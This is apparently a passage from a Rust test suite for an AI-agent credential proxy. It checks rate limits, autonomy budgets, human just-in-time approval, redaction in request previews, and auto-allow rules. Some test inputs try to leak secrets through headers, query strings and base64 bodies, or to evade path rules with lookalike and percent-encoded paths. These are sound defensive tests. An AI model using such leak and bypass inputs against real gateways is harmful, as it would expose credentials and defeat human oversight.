            connect_status(&handle, "custom.reg:8443")
                .await
                .starts_with("HTTP/1.1 200")
        );
        handle.shutdown();
    }

    #[tokio::test]
    async fn rate_limit_per_min_returns_429_and_audits() {
        let upstream = start_upstream("api.stripe.com").await;
        let mut registry = PlaceholderRegistry::new();
        let placeholder = registry.register(
            "KEY",
            Zeroizing::new(["sk", "live", "RATE_LIMIT_KEY_999"].join("_")),
            EgressSpec {
                rate_limit_per_min: Some(2),
                ..egress("api.stripe.com", &["/v1/"])
            },
            None,
        );
        let cfg = config_for(registry, "api.stripe.com", &upstream);
        let handle = start_proxy(cfg).await.unwrap();
        let headers = agent_headers(&handle, &placeholder);

        for _ in 0..2 {
            let (status, _, _) = send(
                handle.addr,
                Method::GET,
                "/cap/KEY/v1/charges",
                &headers,
                Vec::new(),
            )
            .await;
            assert_eq!(status, StatusCode::OK);
        }

        let (status, _, body) = send(
            handle.addr,
            Method::GET,
            "/cap/KEY/v1/charges",
            &headers,
            Vec::new(),
        )
        .await;
        assert_eq!(status, StatusCode::TOO_MANY_REQUESTS);
        assert!(body.contains("rate limit exceeded"), "{body}");
        assert_eq!(upstream.seen().len(), 2);
        assert!(
            handle
                .audit_sink
                .snapshot()
                .iter()
                .any(|e| e.decision == AuditDecision::RateLimited)
        );
        handle.shutdown();
    }

    // ---- autonomy budgets ----

    fn budget(tweak: impl FnOnce(&mut premier_policy::AutonomyBudget)) -> Arc<BudgetTracker> {
        let mut limits = premier_policy::AutonomyBudget::default();
        tweak(&mut limits);
        Arc::new(BudgetTracker::new(
            "s-1",
            "user:alice",
            Some("ui-agent".to_owned()),
            limits,
            600,
        ))
    }

    #[tokio::test]
    async fn egress_cap_pauses_then_raise_limits_resumes() {
        let b = budget(|l| l.max_egress_requests = Some(2));
        assert!(b.check_and_record_egress_request(10).is_ok());
        assert!(b.check_and_record_egress_request(10).is_ok());
        let alert = b.check_and_record_egress_request(10).unwrap_err();
        assert_eq!(alert.metric, "egress_requests");
        assert_eq!((alert.current, alert.limit), (3, 2));
        assert_eq!(b.gate_state(), BudgetGateDecision::Paused);
        assert!(b.is_paused() && !b.is_terminated());
        assert!(b.check_and_record_egress_request(0).is_err());
        let snap = b.snapshot();
        assert_eq!(snap.egress_requests, 2);
        assert_eq!(snap.breached_metric.as_deref(), Some("egress_requests"));

        let waiter = {
            let b = Arc::clone(&b);
            tokio::spawn(async move { b.wait_resume_or_terminate().await })
        };
        tokio::task::yield_now().await;
        let mut raised = b.snapshot().limits;
        raised.max_egress_requests = Some(10);
        let snap = b.raise_limits(raised, true);
        assert!(!snap.paused && snap.breached_metric.is_none());
        assert_eq!(waiter.await.unwrap(), BudgetResumeOutcome::Resumed);
        assert!(b.check_and_record_egress_request(0).is_ok());
    }

    #[tokio::test]
    async fn egress_bytes_terminate_and_stay_terminated() {
        let b = budget(|l| {
            l.max_egress_bytes = Some(100);
            l.on_budget_exceeded = premier_policy::BudgetAction::Terminate;
        });
        let mut alerts = b.subscribe_alerts();
        assert!(b.record_egress_bytes(60).is_none());
        let alert = b.record_egress_bytes(60).unwrap();
        assert_eq!(alert.action, premier_policy::BudgetAction::Terminate);
        assert_eq!(alerts.recv().await.unwrap(), alert);
        assert!(b.is_terminated());
        assert_eq!(
            b.wait_resume_or_terminate().await,
            BudgetResumeOutcome::Terminated
        );
        // A terminated session cannot be resumed, and re-breaching does not re-alert.
        let snap = b.raise_limits(premier_policy::AutonomyBudget::default(), true);
        assert!(snap.terminated);
        assert!(b.record_egress_bytes(1).is_none());
        // A request that would cross the byte cap is refused before it is counted.
        let b = budget(|l| l.max_egress_bytes = Some(10));
        assert!(b.check_and_record_egress_request(11).is_err());
        assert_eq!(b.snapshot().egress_bytes, 0);
    }

    #[test]
    fn jit_cap_refuses_before_queueing() {
        let b = budget(|l| l.max_jit_requests = Some(1));
        assert!(b.record_jit_request().is_ok());
        let alert = b.record_jit_request().unwrap_err();
        assert_eq!(alert.metric, "jit_requests");
        assert_eq!(b.snapshot().jit_requests, 1);
        assert!(b.is_paused());
    }

    #[test]
    fn denied_attempt_anomaly_threshold_and_workspace_caps() {
        let b = budget(|l| l.max_denied_attempts = Some(2));
        assert!(b.record_denied_attempt("a").is_none());
        assert!(b.record_denied_attempt("b").is_none());
        assert_eq!(
            b.record_denied_attempt("c").unwrap().metric,
            "denied_attempts"
        );
        assert!(b.is_paused());

        let b = budget(|l| {
            l.max_files_modified = Some(3);
            l.max_lines_changed = Some(100);
            l.max_workspace_bytes = Some(1000);
        });
        assert!(b.update_workspace(3, 100, 1000).is_none());
        b.record_scrubbed(7);
        assert_eq!(b.snapshot().bytes_scrubbed, 7);
        assert_eq!(
            b.update_workspace(3, 101, 10).unwrap().metric,
            "lines_changed"
        );
        b.terminate("operator kill");
        let snap = b.snapshot();
        assert!(snap.terminated && !snap.paused);
        assert_eq!(snap.breach_reason.as_deref(), Some("operator kill"));
    }

    #[test]
    fn revoke_principal_denies_pending_and_expires_live_grants() {
        let hub = ApprovalHub::new();
        let ask = |principal: &str, profile: &str| ApprovalRequest {
            principal: principal.to_owned(),
            agent_profile: Some(profile.to_owned()),
            var_name: "KEY".to_owned(),
            host: "api.example.com".to_owned(),
            method: "GET".to_owned(),
            path: "/".to_owned(),
            ttl_secs: 300,
            ..Default::default()
        };
        let (pending, mut rx) = hub.enqueue(ask("user:alice", "ui-agent"));
        let (granted, _rx) = hub.enqueue(ask("user:alice", "other-agent"));
        hub.decide(&granted.id, true, None).unwrap();
        let (bob, _bob_rx) = hub.enqueue(ask("user:bob", "bob-agent"));
        assert!(hub.has_grant(&ask("user:alice", "other-agent")));

        assert_eq!(hub.revoke_principal("user:alice"), 2);
        assert!(matches!(rx.try_recv(), Ok(GateOutcome::Denied { .. })));
        let by_id = |id: &str| hub.list().into_iter().find(|i| i.id == id).unwrap();
        assert_eq!(by_id(&pending.id).status, ApprovalStatus::Denied);
        assert_eq!(by_id(&granted.id).status, ApprovalStatus::Expired);
        assert!(!hub.has_grant(&ask("user:alice", "other-agent")));
        assert_eq!(by_id(&bob.id).status, ApprovalStatus::Pending);
        // Matching by agent profile, and nothing left to revoke the second time.
        assert_eq!(hub.revoke_principal("bob-agent"), 1);
        assert_eq!(hub.revoke_principal("bob-agent"), 0);
    }

    #[test]
    fn cage_argv_carries_only_the_limits_that_are_set() {
        let listen: SocketAddr = "127.0.0.1:3128".parse().unwrap();
        assert_eq!(
            cage::cage_exec_argv_with_limits(listen, &ResourceLimits::default()),
            cage::cage_exec_argv(listen)
        );
        let limits = ResourceLimits {
            max_memory_mb: Some(512),
            max_pids: None,
            max_cpu_secs: Some(30),
        };
        let argv = cage::cage_exec_argv_with_limits(listen, &limits);
        assert_eq!(
            &argv[argv.len() - 5..],
            ["--max-memory-mb", "512", "--max-cpu-secs", "30", "--"]
        );
        let from_budget = premier_policy::AutonomyBudget {
            max_pids: Some(64),
            ..Default::default()
        };
        assert_eq!(ResourceLimits::from(&from_budget).max_pids, Some(64));
    }

    #[tokio::test]
    async fn proxy_enforces_budget_with_429_then_403_and_audits() {
        let b = budget(|l| l.max_egress_requests = Some(1));
        let b2 = Arc::clone(&b);
        let (handle, _upstream, placeholder) =
            stripe_proxy("sk_live_budget_secret", move |cfg| cfg.budget = Some(b2)).await;
        let headers = agent_headers(&handle, &placeholder);
        let get = || {
            send(
                handle.addr,
                Method::GET,
                "/cap/KEY/v1/ok",
                &headers,
                Vec::new(),
            )
        };

        assert_eq!(get().await.0, StatusCode::OK);
        let (status, _, body) = get().await;
        assert_eq!(status, StatusCode::TOO_MANY_REQUESTS, "{body}");
        let (status, _, body) = get().await;
        assert_eq!(status, StatusCode::TOO_MANY_REQUESTS);
        assert!(body.contains("awaiting human budget approval"), "{body}");
        assert!(
            handle
                .audit_sink
                .snapshot()
                .iter()
                .any(|e| e.decision == AuditDecision::BudgetExceeded)
        );
        assert!(!audit_text(&handle).contains("sk_live_budget_secret"));

        b.terminate("kill");
        let (status, _, body) = get().await;
        assert_eq!(status, StatusCode::FORBIDDEN);
        assert!(body.contains("session terminated"), "{body}");
        let line = connect_status(&handle, "crates.io:443").await;
        assert!(line.contains("403"), "{line}");
    }

    #[tokio::test]
    async fn passthrough_connect_tunnel_meters_bytes_and_severs_on_budget_breach() {
        use tokio::io::{AsyncReadExt, AsyncWriteExt};

        // Plain echo server pinned for `crates.io:443`.
        let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
        let echo_addr = listener.local_addr().unwrap();
        tokio::spawn(async move {
            while let Ok((mut sock, _)) = listener.accept().await {
                tokio::spawn(async move {
                    let mut buf = [0u8; 4096];
                    while let Ok(n) = sock.read(&mut buf).await {
                        if n == 0 {
                            break;
                        }
                        if sock.write_all(&buf[..n]).await.is_err() {
                            break;
                        }
                    }
                });
            }
        });

        let b = budget(|l| {
            l.max_egress_bytes = Some(20);
            l.on_budget_exceeded = BudgetAction::Terminate;
        });
        let b2 = Arc::clone(&b);
        let (handle, _upstream, _placeholder) = stripe_proxy("sk_live_tunnel_test", move |cfg| {
            cfg.budget = Some(b2);
            cfg.allow_passthrough_hosts.insert("crates.io".to_owned());
            cfg.upstream_resolve
                .insert("crates.io".to_owned(), echo_addr);
        })
        .await;

        let (mut tunnel, reply) = raw(
            handle.addr,
            &format!(
                "CONNECT crates.io:443 HTTP/1.1\r\nHost: crates.io:443\r\nProxy-Authorization: Bearer {}\r\n\r\n",
                handle.auth_token
            ),
        )
        .await;
        assert!(reply.starts_with("HTTP/1.1 200"), "{reply}");

        // First small write succeeds and echoes back (6 up + 6 down = 12 bytes <= 20).
        tunnel.write_all(b"hello!").await.unwrap();
        let mut buf = [0u8; 64];
        let n = tunnel.read(&mut buf).await.unwrap();
        assert_eq!(&buf[..n], b"hello!");
        tokio::time::sleep(std::time::Duration::from_millis(30)).await;
        assert_eq!(b.snapshot().egress_bytes, 12);
        assert!(!b.is_terminated());

        // Pushing past 20 bytes breaches the budget mid-tunnel and severs the stream immediately.
        let _ = tunnel.write_all(b"0123456789abcdef").await;
        let deadline = tokio::time::Instant::now() + std::time::Duration::from_secs(2);
        loop {
            if b.is_terminated() {
                break;
            }
            assert!(
                tokio::time::Instant::now() < deadline,
                "passthrough tunnel did not trip budget: {:?}",
                b.snapshot()
            );
            tokio::time::sleep(std::time::Duration::from_millis(10)).await;
        }
        // Further reads observe EOF/reset once the proxy tears down the tunnel.
        let rest = tunnel.read(&mut buf).await;
        assert!(matches!(rest, Ok(0) | Err(_)), "{rest:?}");
        assert!(
            handle
                .audit_sink
                .snapshot()
                .iter()
                .any(|e| e.decision == AuditDecision::BudgetExceeded)
        );
        handle.shutdown();
    }

    /// Stripe-shaped JIT fixture: capability `KEY` with `spec` (forced to `approval = "jit"`).
    async fn jit_proxy(
        secret: &str,
        spec: EgressSpec,
        tweak: impl FnOnce(&mut ProxyConfig),
    ) -> (ProxyHandle, Upstream, String) {
        let upstream = start_upstream("api.stripe.com").await;
        let mut registry = PlaceholderRegistry::new();
        let placeholder = registry.register(
            "KEY",
            Zeroizing::new(secret.to_owned()),
            EgressSpec {
                approval: ApprovalMode::Jit,
                ..spec
            },
            None,
        );
        let mut cfg = config_for(registry, "api.stripe.com", &upstream);
        tweak(&mut cfg);
        (start_proxy(cfg).await.unwrap(), upstream, placeholder)
    }

    #[tokio::test(flavor = "multi_thread", worker_threads = 4)]
    async fn knock_carries_a_sanitized_wire_preview_and_the_denial_reason() {
        let secret_buf = ["sk", "live", "JitPreviewKey_889900"].join("_");
        let secret = secret_buf.as_str();
        let b64_secret = STANDARD.encode(secret);
        let hub = Arc::new(ApprovalHub::new());
        let (handle, upstream, placeholder) =
            jit_proxy(secret, egress("api.stripe.com", &["/v1/"]), |cfg| {
                cfg.approval_gate = Box::new(HubGate(Arc::clone(&hub)));
                cfg.session_context = Some(SessionContext {
                    session_id: None,
                    branch: Some("feature/knock".to_owned()),
                    command: None,
                });
            })
            .await;

        // The approver reads the knock, then denies it with a reason.
        let mut events = hub.subscribe();
        let decider = Arc::clone(&hub);
        let knock = tokio::spawn(async move {
            let pending = events.recv().await.unwrap();
            decider
                .decide_with_options(
                    &pending.id,
                    ApprovalDecision {
                        approved: false,
                        denial_reason: Some("Use the test-mode key".to_owned()),
                        ..ApprovalDecision::default()
                    },
                )
                .unwrap();
            pending
        });

        let token = handle.auth_token.clone();
        let mut headers = agent_headers(&handle, &placeholder);
        headers.extend([
            ("x-trace", format!("session={token}")),
            ("x-leak", secret.to_owned()),
            ("connection", "x-hop".to_owned()),
            ("x-hop", "1".to_owned()),
        ]);
        // The raw secret and its base64 form straddle the 1024-char preview cut.
        let body = format!(
            "{}{secret} {b64_secret} {token} {}",
            "a".repeat(1012),
            "z".repeat(200)
        );
        let (status, _, resp) = send(
            handle.addr,
            Method::POST,
            &format!("/cap/KEY/v1/charges?amount=100&currency=zzqq&token={secret}"),
            &headers,
            body.clone().into_bytes(),
        )
        .await;
        assert_eq!(status, StatusCode::FORBIDDEN);
        assert!(
            resp.contains("JIT approval denied for 'KEY': Use the test-mode key"),
            "{resp}"
        );
        assert!(upstream.seen().is_empty());

        let pending = knock.await.unwrap();
        assert_eq!(pending.var_name, "KEY");
        assert_eq!(pending.path, "/v1/");
        assert_eq!(pending.concrete_path.as_deref(), Some("/v1/charges"));
        assert_eq!(pending.risk_level, RiskLevel::SensitiveScope);
        assert_eq!(
            pending.intent_summary.as_deref(),
            Some("Sensitive mutation (POST) on api.stripe.com/v1/charges")
        );
        assert_eq!(pending.sensitivity.as_deref(), Some("secret"));
        assert_eq!(
            pending.session_context.as_ref().unwrap().branch.as_deref(),
            Some("feature/knock")
        );
        assert!(pending.expires_at.is_some());

        let preview = pending.wire_preview.clone().unwrap();
        assert_eq!(preview.method, "POST");
        assert_eq!(preview.host, "api.stripe.com");
        assert_eq!(preview.concrete_path, "/v1/charges");
        assert_eq!(preview.query_keys, ["amount", "currency", "token"]);
        let header = |name: &str| preview.headers.iter().find(|h| h.name == name);
        for dropped in ["proxy-authorization", "connection", "x-hop"] {
            assert!(header(dropped).is_none(), "{dropped} must not be previewed");
        }
        let auth = header("authorization").unwrap();
        assert_eq!(auth.value, format!("Bearer {placeholder}"));
        assert!(auth.contains_placeholder);
        assert_eq!(
            header("x-trace").unwrap().value,
            "session=[REDACTED:PROXY_TOKEN]"
        );
        assert!(!header("x-trace").unwrap().contains_placeholder);
        assert_eq!(header("x-leak").unwrap().value, "[REDACTED:KEY]");
        assert_eq!(preview.body_size_bytes, body.len());
        assert!(preview.body_truncated && !preview.body_is_binary);
        assert_eq!(preview.body_preview.as_ref().unwrap().chars().count(), 1024);

        // Zero secret bytes, in any form, anywhere a human or the hub will ever see.
        let decided = hub.list()[0].clone();
        assert_eq!(decided.status, ApprovalStatus::Denied);
        assert_eq!(
            decided.denial_reason.as_deref(),
            Some("Use the test-mode key")
        );
        for text in [
            serde_json::to_string(&pending).unwrap(),
            serde_json::to_string(&decided).unwrap(),
            serde_json::to_string(&hub.snapshot()).unwrap(),
            audit_text(&handle),
            resp,
        ] {
            for needle in [secret, &secret[..10], &b64_secret, &token, "zzqq"] {
                assert!(!text.contains(needle), "{needle} leaked into {text}");
            }
        }
        assert!(audit_text(&handle).contains("Use the test-mode key"));
        handle.shutdown();
    }

    #[tokio::test]
    async fn wire_preview_shows_injected_placeholders_never_secrets() {
        let secret = "sk_live_INJECT_ONLY_5150";
        for (inject, injected_header, keys) in [
            (
                InjectSpec::BearerHeader {
                    header: "Authorization".to_owned(),
                },
                Some(("authorization", "Bearer ")),
                vec!["limit"],
            ),
            (
                InjectSpec::Header {
                    header: "X-Api-Key".to_owned(),
                    prefix: "Key ".to_owned(),
                },
                Some(("x-api-key", "Key ")),
                vec!["limit"],
            ),
            (
                InjectSpec::QueryParam {
                    param: "api_key".to_owned(),
                },
                None,
                vec!["limit", "api_key"],
            ),
        ] {
            let shown = Arc::new(Mutex::new(Vec::<ApprovalRequest>::new()));
            let log = Arc::clone(&shown);
            let spec = EgressSpec {
                inject,
                ..egress("api.stripe.com", &["/v1/"])
            };
            let (handle, upstream, placeholder) = jit_proxy(secret, spec, |cfg| {
                cfg.approval_gate = Box::new(CallbackGate(move |req: &ApprovalRequest| {
                    log.lock().unwrap().push(req.clone());
                    true
                }));
            })
            .await;
            let headers = vec![(
                "proxy-authorization",
                format!("Bearer {}", handle.auth_token),
            )];
            // A binary body is sized but never shown.
            let (status, _, _) = send(
                handle.addr,
                Method::GET,
                "/cap/KEY/v1/customers?limit=3",
                &headers,
                vec![0, 1, 2],
            )
            .await;
            assert_eq!(status, StatusCode::OK);

            let req = shown.lock().unwrap()[0].clone();
            assert_eq!(req.risk_level, RiskLevel::ReadOnly);
            let preview = req.wire_preview.clone().unwrap();
            assert_eq!(preview.query_keys, keys);
            assert!(preview.body_is_binary && preview.body_preview.is_none());
            assert_eq!(preview.body_size_bytes, 3);
            if let Some((name, prefix)) = injected_header {
                assert_eq!(upstream.seen()[0].header(name), format!("{prefix}{secret}"));
                let shown: Vec<_> = preview.headers.iter().filter(|h| h.name == name).collect();
                assert_eq!(shown.len(), 1);
                assert_eq!(shown[0].value, format!("{prefix}{placeholder}"));
                assert!(shown[0].contains_placeholder);
            }
            assert!(!serde_json::to_string(&req).unwrap().contains(secret));
            handle.shutdown();
        }
    }

    #[tokio::test]
    async fn auto_allow_skips_the_knock_only_for_the_exact_learned_shape() {
        let rule = AutoAllowRule {
            agent_profile: Some("ui-agent".to_owned()),
            host: "api.stripe.com".to_owned(),
            methods: vec!["GET".to_owned()],
            path_prefixes: vec!["/v1/charges".to_owned()],
        };
        for (profile, method, uri, expect, prompts_after) in [
            (
                "ui-agent",
                Method::GET,
                "/cap/KEY/v1/charges/ch_1",
                StatusCode::OK,
                0,
            ),
            (
                "ui-agent",
                Method::POST,
                "/cap/KEY/v1/charges",
                StatusCode::FORBIDDEN,
                1,
            ),
            (
                "ui-agent",
                Method::GET,
                "/cap/KEY/v1/customers",
                StatusCode::FORBIDDEN,
                1,
            ),
            (
                "ui-agent",
                Method::GET,
                "/cap/KEY/v1/chargesevil",
                StatusCode::FORBIDDEN,
                1,
            ),
            (
                "deploy-agent",
                Method::GET,
                "/cap/KEY/v1/charges",
                StatusCode::FORBIDDEN,
                1,
            ),
        ] {
            let prompts = Arc::new(AtomicUsize::new(0));
            let counter = Arc::clone(&prompts);
            let spec = EgressSpec {
                auto_allow: vec![rule.clone()],
                ..egress("api.stripe.com", &["/v1/"])
            };
            let (handle, upstream, placeholder) = jit_proxy("sk_live_AUTO_ALLOW_1", spec, |cfg| {
                cfg.identity = alice(profile);
                cfg.approval_gate = Box::new(CallbackGate(move |_req: &ApprovalRequest| {
                    counter.fetch_add(1, Ordering::Relaxed);
                    false
                }));
            })
            .await;
            let headers = agent_headers(&handle, &placeholder);
            let (status, _, _) = send(handle.addr, method, uri, &headers, Vec::new()).await;
            assert_eq!(status, expect, "{profile} {uri}");
            assert_eq!(
                prompts.load(Ordering::Relaxed),
                prompts_after,
                "{profile} {uri}"
            );
            assert_eq!(upstream.seen().len(), usize::from(expect == StatusCode::OK));
            handle.shutdown();
        }
    }

    #[tokio::test]
    async fn auto_allow_never_skips_the_knock_for_sensitive_scopes_or_restricted_secrets() {
        let rule = AutoAllowRule {
            agent_profile: Some("ui-agent".to_owned()),
            host: "api.stripe.com".to_owned(),
            methods: vec!["GET".to_owned()],
            path_prefixes: vec!["/v1/".to_owned()],
        };
        for (restricted, uri, prompts_after) in [
            (false, "/cap/KEY/v1/customers", 0),
            (false, "/cap/KEY/v1/secrets/s_1", 1),
            (false, "/cap/KEY/v1/k%65ys", 1),
            (true, "/cap/KEY/v1/customers", 1),
        ] {
            let prompts = Arc::new(AtomicUsize::new(0));
            let counter = Arc::clone(&prompts);
            let spec = EgressSpec {
                auto_allow: vec![rule.clone()],
                ..egress("api.stripe.com", &["/v1/"])
            };
            let mut restricted_ph = None;
            let (handle, _upstream, placeholder) = jit_proxy("sk_live_AUTO_2", spec, |cfg| {
                if restricted {
                    let bound = cfg.registry.get_by_var("KEY").unwrap().clone();
                    let mut reg = PlaceholderRegistry::new();
                    restricted_ph = Some(reg.register_with_sensitivity(
                        "KEY",
                        bound.secret,
                        bound.egress,
                        None,
                        Sensitivity::Restricted,
                    ));
                    cfg.registry = reg;
                }
                cfg.approval_gate = Box::new(CallbackGate(move |_req: &ApprovalRequest| {
                    counter.fetch_add(1, Ordering::Relaxed);
                    false
                }));
            })
            .await;
            let placeholder = restricted_ph.unwrap_or(placeholder);
            let headers = agent_headers(&handle, &placeholder);
            let (status, _, _) = send(handle.addr, Method::GET, uri, &headers, Vec::new()).await;
            let expect = if prompts_after == 0 {
                StatusCode::OK
            } else {
                StatusCode::FORBIDDEN
            };
            assert_eq!(status, expect, "restricted={restricted} {uri}");
            assert_eq!(
                prompts.load(Ordering::Relaxed),
                prompts_after,
                "restricted={restricted} {uri}"
            );
            handle.shutdown();
        }
    }
}
